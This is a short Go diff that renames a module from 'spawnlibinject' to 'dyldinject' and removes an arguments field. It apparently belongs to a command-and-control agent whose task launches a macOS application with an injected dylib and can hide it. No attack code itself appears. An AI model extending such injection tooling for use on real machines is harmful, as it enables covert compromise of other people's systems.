@@ -1,4 +1,4 @@
-package spawnlibinject
+package dyldinject
 
 import (
 	// Standard
@@ -15,7 +15,6 @@ var mu sync.Mutex
 type Arguments struct {
 	Application string `json:"application"`
 	Dylibpath   string `json:"dylibpath"`
-	Args        string `json:"arguments"`
 	HideApp     bool   `json:"hideApp"`
 }
 
@@ -38,7 +37,7 @@ func Run(task structs.Task) {
 		return
 	}
 
-	r, err := runCommand(args.Application, args.Dylibpath, args.Args, args.HideApp)
+	r, err := runCommand(args.Application, args.Dylibpath, args.HideApp)
 	if err != nil {
 		msg.UserOutput = err.Error()
 		msg.Completed = true
